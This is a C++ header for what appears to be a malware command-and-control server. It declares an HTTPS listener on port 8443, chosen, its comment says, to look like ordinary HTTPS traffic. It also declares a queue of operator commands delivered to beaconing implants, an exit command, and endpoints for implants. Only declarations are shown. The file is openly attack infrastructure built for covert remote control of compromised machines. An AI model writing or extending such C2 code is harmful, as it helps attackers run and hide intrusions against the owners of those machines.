#pragma once

#include <httplib.h>

#include <cstddef>
#include <cstdint>
#include <string>

// Alternate HTTPS port: looks like ordinary HTTPS traffic and doesn't collide
// with 443.
inline constexpr std::uint16_t kPort = 8443;

// Sanity cap on a single command or result payload (1 MiB).
inline constexpr std::size_t kMaxPayload = 1u << 20;

// Result of draining the operator command queue on a beacon.
enum class Pending
{
    None,
    Command,
    Exit
};

// Move the next queued command into 'command'.
Pending take_pending(std::string &command);

// Queue an operator command for the next beacon.
void queue_command(const std::string &command);

// Ask the next beacon to deliver CMD_EXIT.
void request_exit();

// Register the implant-facing endpoints.
void register_all_beacon_endpoints(httplib::SSLServer &server);
